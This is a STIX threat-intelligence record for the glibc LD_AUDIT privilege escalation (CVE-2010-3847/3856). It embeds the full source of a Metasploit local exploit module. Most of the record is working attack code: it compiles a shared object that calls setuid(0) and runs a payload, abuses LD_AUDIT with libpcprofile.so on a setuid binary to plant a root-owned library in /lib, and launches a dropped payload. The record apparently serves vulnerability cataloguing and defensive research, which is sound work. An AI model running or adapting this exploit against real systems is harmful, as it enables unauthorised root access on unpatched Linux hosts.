{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72ad0ce9-d2c7-4db0-8148-b9c1eec8cf70",
    "created": "2024-08-14T16:58:33.567183Z",
    "modified": "2024-08-14T16:58:33.567187Z",
    "name": "glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation",
    "description": " This module attempts to gain root privileges on Linux systems by abusing a vulnerability in the GNU C Library (glibc) dynamic linker.  glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not properly restrict use of the LD_AUDIT environment variable when loading setuid executables. This allows loading arbitrary shared objects from the trusted library search path with the privileges of the suid user.  This module uses LD_AUDIT to load the libpcprofile.so shared object distributed with some versions of glibc, and leverages arbitrary file creation functionality in the library constructor to write a root-owned world-writable file to a system trusted search path (usually /lib). The file is then overwritten with a shared object then loaded with LD_AUDIT resulting in arbitrary code execution.  This module has been tested successfully on glibc version 2.11.1 on Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386.  RHEL 5 is reportedly affected, but untested. Some glibc distributions do not contain the libpcprofile.so library required for successful exploitation.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/glibc_ld_audit_dso_load_priv_esc.rb",
            "external_id": "glibc_ld_audit_dso_load_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3847"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3856"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2010/Oct/257"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2010/Oct/344"
        },
        {
            "source_name": "reference",
            "url": "https://www.ubuntu.com/usn/usn-1009-1"
        },
        {
            "source_name": "reference",
            "url": "https://security-tracker.debian.org/tracker/CVE-2010-3847"
        },
        {
            "source_name": "reference",
            "url": "https://security-tracker.debian.org/tracker/CVE-2010-3856"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/CVE-2010-3847"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/CVE-2010-3856"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges on Linux systems by abusing\n          a vulnerability in the GNU C Library (glibc) dynamic linker.\n\n          glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not\n          properly restrict use of the LD_AUDIT environment variable when loading\n          setuid executables. This allows loading arbitrary shared objects from\n          the trusted library search path with the privileges of the suid user.\n\n          This module uses LD_AUDIT to load the libpcprofile.so shared object,\n          distributed with some versions of glibc, and leverages arbitrary file\n          creation functionality in the library constructor to write a root-owned\n          world-writable file to a system trusted search path (usually /lib).\n          The file is then overwritten with a shared object then loaded with\n          LD_AUDIT resulting in arbitrary code execution.\n\n          This module has been tested successfully on glibc version 2.11.1 on\n          Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386.\n\n          RHEL 5 is reportedly affected, but untested. Some glibc distributions\n          do not contain the libpcprofile.so library required for successful\n          exploitation.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Tavis Ormandy', # Discovery and exploit\n          'zx2c4',         # \"I Can't Read and I Won't Race You Either\" exploit\n          'Marco Ivaldi',  # raptor_ldaudit and raptor_ldaudit2 exploits\n          'Todor Donev',   # libmemusage.so exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2010-10-18',\n        'Platform' => 'linux',\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [ 'Automatic', {} ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'CVE', '2010-3847' ],\n          [ 'CVE', '2010-3856' ],\n          [ 'BID', '44154' ],\n          [ 'BID', '44347' ],\n          [ 'EDB', '15274' ],\n          [ 'EDB', '15304' ],\n          [ 'EDB', '18105' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2010/Oct/257' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2010/Oct/344' ],\n          [ 'URL', 'https://www.ubuntu.com/usn/usn-1009-1' ],\n          [ 'URL', 'https://security-tracker.debian.org/tracker/CVE-2010-3847' ],\n          [ 'URL', 'https://security-tracker.debian.org/tracker/CVE-2010-3856' ],\n          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2010-3847' ],\n          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2010-3856' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options [\n      OptString.new('SUID_EXECUTABLE', [ true, 'Path to a SUID executable', '/bin/ping' ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def suid_exe_path\n    datastore['SUID_EXECUTABLE']\n  end\n\n  def check\n    glibc_banner = cmd_exec 'ldd --version'\n    glibc_version = Rex::Version.new glibc_banner.scan(/^ldd\\s+\\(.*\\)\\s+([\\d.]+)/).flatten.first\n    if glibc_version.to_s.eql? ''\n      vprint_error 'Could not determine the GNU C library version'\n      return CheckCode::Safe\n    elsif glibc_version >= Rex::Version.new('2.12.2') ||\n          (glibc_version >= Rex::Version.new('2.11.3') && glibc_version < Rex::Version.new('2.12'))\n      vprint_error \"GNU C Library version #{glibc_version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"GNU C Library version #{glibc_version} is vulnerable\"\n\n    lib = 'libpcprofile.so'\n    @lib_dir = nil\n    vprint_status \"Checking for #{lib} in system search paths\"\n    search_paths = cmd_exec \"env -i LD_PRELOAD=#{rand_text_alpha rand(10..15)} LD_DEBUG=libs env 2>&1 | grep 'search path='\"\n    search_paths.split('path=')[1..-1].join.split(':').each do |path|\n      lib_dir = path.to_s.strip\n      next if lib_dir.eql? ''\n\n      libs = cmd_exec \"ls '#{lib_dir}'\"\n      if libs.include? lib\n        @lib_dir = lib_dir\n        break\n      end\n    end\n    if @lib_dir.nil?\n      vprint_error \"Could not find #{lib}\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Found #{lib} in #{@lib_dir}\"\n\n    return CheckCode::Safe(\"#{suid_exe_path} file not found\") unless file? suid_exe_path\n    return CheckCode::Detected(\"#{suid_exe_path} is not setuid\") unless setuid? suid_exe_path\n\n    vprint_good \"#{suid_exe_path} is setuid\"\n\n    CheckCode::Appears\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    cmd_exec \"chmod +x '#{path}'\"\n    register_file_for_cleanup path\n  end\n\n  def on_new_session(client)\n    # remove root owned shared object from system load path\n    if client.type.eql? 'meterpreter'\n      client.core.use 'stdapi' unless client.ext.aliases.include? 'stdapi'\n      client.fs.file.rm @so_path\n    else\n      client.shell_command_token \"rm #{@so_path}\"\n    end\n  end\n\n  def exploit\n    check_status = check\n\n    if check_status == CheckCode::Appears\n      print_good 'The target appears to be vulnerable'\n    elsif check_status == CheckCode::Detected\n      fail_with Failure::BadConfig, \"#{suid_exe_path} is not suid\"\n    else\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    payload_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n\n    # Set target\n    uname = cmd_exec 'uname -m'\n    vprint_status \"System architecture is #{uname}\"\n    if target.name.eql? 'Automatic'\n      case uname\n      when 'x86_64'\n        my_target = targets[2]\n      when /x86/, /i\\d86/\n        my_target = targets[1]\n      else\n        fail_with Failure::NoTarget, 'Unable to automatically select a target'\n      end\n    else\n      my_target = target\n    end\n    print_status \"Using target: #{my_target.name}\"\n\n    cpu = nil\n    case my_target['Arch']\n    when ARCH_X86\n      cpu = Metasm::Ia32.new\n    when ARCH_X64\n      cpu = Metasm::X86_64.new\n    else\n      fail_with Failure::NoTarget, 'Target is not compatible'\n    end\n\n    # Compile shared object\n    so_stub = %|\n      extern int setuid(int);\n      extern int setgid(int);\n      extern int system(const char *__s);\n\n      void init(void) __attribute__((constructor));\n\n      void __attribute__((constructor)) init() {\n        setuid(0);\n        setgid(0);\n        system(\"#{payload_path}\");\n      }\n    |\n\n    begin\n      so = Metasm::ELF.compile_c(cpu, so_stub).encode_string(:lib)\n    rescue StandardError\n      print_error \"Metasm encoding failed: #{$ERROR_INFO}\"\n      elog \"Metasm encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}\"\n      elog \"Call stack:\\n#{$ERROR_INFO.backtrace.join \"\\n\"}\"\n      fail_with Failure::Unknown, 'Metasm encoding failed'\n    end\n\n    # Upload shared object\n    so_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    so_path = \"#{base_dir}/#{so_name}\"\n    upload_and_chmodx so_path, so\n\n    # Upload exploit\n    @so_path = \"#{@lib_dir}/#{so_name}.so\"\n    exp = %(\n      umask 0\n      LD_AUDIT=\"libpcprofile.so\" PCPROFILE_OUTPUT=\"#{@so_path}\" #{suid_exe_path} 2>/dev/null\n      umask 0022\n      cat #{so_path} > #{@so_path}\n      LD_AUDIT=\"#{so_name}.so\" #{suid_exe_path}\n      echo > #{@so_path}\n    )\n    exp_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    exp_path = \"#{base_dir}/#{exp_name}\"\n    upload_and_chmodx exp_path, exp\n\n    # Upload payload\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    print_status 'Launching exploit...'\n    # The echo at the end of the command is required\n    # else the original session may die\n    output = cmd_exec \"#{exp_path}& echo \"\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}